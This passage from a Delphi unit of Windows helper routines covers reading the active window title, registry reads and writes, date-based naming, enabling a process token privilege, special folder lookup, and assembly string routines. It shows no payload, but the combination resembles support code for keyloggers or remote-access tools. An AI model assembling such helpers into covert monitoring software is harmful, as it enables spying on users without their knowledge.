  GetWindowText(GetForegroundWindow, Title, SizeOf(Title));
  Result := Title;
end;
   
function ReadKeyDword(Key: HKey; SubKey: string; Data: string): dword;
var
  RegKey: HKey;
  Value, ValueLen: dword;
begin
  ValueLen := 1024;
  RegOpenKey(Key,PChar(SubKey),RegKey);
  RegQueryValueEx(RegKey, PChar(Data), nil, nil, @Value, @ValueLen);
  RegCloseKey(RegKey);
  Result := Value;
end;

procedure CreateKeyString(Key: HKEY; Subkey, Name, Value: string);
var
  regkey: Hkey;
begin
  RegCreateKey(Key, PChar(subkey), regkey);
  RegSetValueEx(regkey, PChar(name), 0, REG_EXPAND_SZ, PChar(value), Length(value));
  RegCloseKey(regkey);
end;

function ReadKeyString(Key:HKEY; Path:string; Value, Default: string): string;
Var
  Handle:hkey;
  RegType, DataSize: Integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Key, pchar(Path), 0, KEY_QUERY_VALUE, Handle) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Handle, pchar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Handle, pchar(Value), nil, @RegType, PByte(pchar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Handle);
  end;
end;

function MyGetMonth: string;
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := MyGetDate('-');
  Delete(TmpStr, 1, Pos('-', TmpStr));
  TmpStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1);
  Delete(TmpStr, 1, Pos('-', TmpStr));

  case StrToInt(TmpStr1) of
    1: Result := 'January';
    2: Result := 'February';
    3: Result := 'March';
    4: Result := 'April';
    5: Result := 'May';
    6: Result := 'June';
    7: Result := 'Jully';
    8: Result := 'August';
    9: Result := 'September';
    10: Result := 'October';
    11: Result := 'November';
    12: Result := 'December';
  end;

  Result := Result + '_' + TmpStr;
end;

procedure SetTokenPrivileges(Priv: string);
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, Pchar(Priv), TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
asm
        PUSH    EDI
        PUSH    ESI
        PUSH    EBX
        MOV     ESI,EAX
        MOV     EDI,EDX
        MOV     EBX,ECX
        XOR     AL,AL
        TEST    ECX,ECX
        JZ      @@1
        REPNE   SCASB
        JNE     @@1
        INC     ECX
@@1:    SUB     EBX,ECX
        MOV     EDI,ESI
        MOV     ESI,EDX
        MOV     EDX,EDI
        MOV     ECX,EBX
        SHR     ECX,2
        REP     MOVSD
        MOV     ECX,EBX
        AND     ECX,3
        REP     MOVSB
        STOSB
        MOV     EAX,EDX
        POP     EBX
        POP     ESI
        POP     EDI
end;

function StrPCopy(Dest: PChar; const Source: string): PChar;
begin
  Result := StrLCopy(Dest, PChar(Source), Length(Source));
end;
  
function RightStr(Text : String ; Num : Integer): String ;
begin
  Result := Copy(Text,length(Text)+1 -Num,Num);
end;

function IncludeTrailingBackslash(Path: string): string;
begin
  Result := Path;
  if RightStr(Path, 1) <> '\' then Result := Result + '\';
end;

function GetSpecialFolder(const CSIDL : integer): string;
var
  RecPath: array[0..255] of char;
begin
  Result := '';
  if SHGetSpecialFolderPath(0, RecPath, CSIDL, false) then
    Result := IncludeTrailingBackslash(RecPath);
end;

function ProgramFilesDir: string;
var
  RecPath: array[0..255] of char;
begin
  Result := GetSpecialFolder($0026); 
end;

function AppDataDir: string;
begin
  Result := GetSpecialFolder($001A);
end;

function MyDocumentsDir: string;
begin
  Result := GetSpecialFolder($0005);
end;

procedure CvtInt;
{ IN:
    EAX:  The integer value to be converted to text
    ESI:  Ptr to the right-hand side of the output buffer:  LEA ESI, StrBuf[16]
    ECX:  Base for conversion: 0 for signed decimal, 10 or 16 for unsigned
    EDX:  Precision: zero padded minimum field width
  OUT:
    ESI:  Ptr to start of converted text (not start of buffer)
    ECX:  Length of converted text
}
asm
        OR      CL,CL
        JNZ     @CvtLoop
@C1:    OR      EAX,EAX
        JNS     @C2
        NEG     EAX
        CALL    @C2
        MOV     AL,'-'
        INC     ECX
        DEC     ESI
        MOV     [ESI],AL
        RET
@C2:    MOV     ECX,10

@CvtLoop:
        PUSH    EDX
        PUSH    ESI
@D1:    XOR     EDX,EDX
        DIV     ECX
        DEC     ESI
        ADD     DL,'0'
        CMP     DL,'0'+10
        JB      @D2
        ADD     DL,('A'-'0')-10
@D2:    MOV     [ESI],DL
        OR      EAX,EAX
        JNE     @D1
        POP     ECX
        POP     EDX
        SUB     ECX,ESI
        SUB     EDX,ECX
        JBE     @D5
        ADD     ECX,EDX
        MOV     AL,'0'
        SUB     ESI,EDX
        JMP     @z
@zloop: MOV     [ESI+EDX],AL
@z:     DEC     EDX
        JNZ     @zloop
        MOV     [ESI],AL
@D5:
end;

function IntToHex(Value: Integer; Digits: Integer): string;
//  FmtStr(Result, '%.*x', [Digits, Value]);
asm
        CMP     EDX, 32        // Digits < buffer length?
        JBE     @A1
        XOR     EDX, EDX
@A1:    PUSH    ESI
        MOV     ESI, ESP
        SUB     ESP, 32
        PUSH    ECX            // result ptr
        MOV     ECX, 16        // base 16     EDX = Digits = field width
        CALL    CvtInt
        MOV     EDX, ESI
        POP     EAX            // result ptr
        CALL    System.@LStrFromPCharLen
        ADD     ESP, 32
        POP     ESI
end;

end.
